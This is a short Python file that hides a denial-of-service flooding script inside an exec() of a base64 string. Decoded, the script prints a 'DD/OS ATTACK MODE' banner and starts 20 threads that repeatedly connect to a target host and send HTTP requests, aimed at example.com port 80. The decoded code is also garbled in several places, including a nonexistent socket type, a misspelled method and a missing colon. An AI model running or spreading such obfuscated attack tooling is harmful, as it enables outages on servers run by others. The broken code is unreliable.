import base64
exec(base64.b64decode(b'aW1wb3J0IHNvY2tldCwgdGhyZWFkaW5nLCB0aW1lCmltcG9ydCBvcwoKZGVmIGJhbm5lcigpOgogICAgcHJpbnQoIlxuPT09PT09PT09PT09PT09PT09PT09PT09PT09XCIpCiAgICBwcmludCgiICAgICAgIFZBTVBJUkUtREQvT1MgQVRUQUNLIE1PREUiKQogICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PSIpCgpjbGFzcyBERE9TX0F0dGFjawogICAgZGVmIF9faW5pdF9fKHNlbGYsIHRhcmdldCwgcG9ydCk6CiAgICAgICAgc2VsZi50YXJnZXQgPSB0YXJnZXQKICAgICAgICBzZWxmLnBvcnQgPSBwb3J0CiAgICAKICAgIGRlZiBhdHRhY2soc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ET0NLRVQpCiAgICAgICAgICAgICAgICBzLnNldGRlZmF1bHR0aW1lb3V0KDAuMSkKICAgICAgICAgICAgICAgIHMuY29ubmVjdCgoIHNlbGYudGFyZ2V0LCBzZWxmLnBvcnQpKQogICAgICAgICAgICAgICAgcGF5bG9hZD1iJ0dFVCAvIEhUVFAvMS4xXHJcbi5cclxuJwogICAgICAgICAgICAgICAgcy5zZW5kKHBheWxvYWQubGVuY29kZSgpKQogICAgICAgICAgICBzLmNsb3NlKCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQoKZGVmIHJ1bl9hdHRhY2sodGFyZ2V0LCBwb3J0LCB0aHJlYWRzPTIwKToKICAgIGJhbm5lcigpCiAgICBwcmludChmIlxuWzFdIFRhcmdldDogJHt0YXJnZXR9OlsgUG9ydDogJHtwb3J0fSBdIikKICAgIHRyeToKICAgICAgICBmb3IgaSBpbiByYW5nZSh0aHJlYWRzKToKICAgICAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9REQPU19BdHRhY2sodGFyZ2V0LCBwb3J0KS5hdHRhY2spLnN0YXJ0KCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTogcHJpbnQoZidFcnJvcjoge2V9JykKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBydW5fYXR0YWNrKCdleGFtcGxlLmNvbScsIDgwKQ=='))
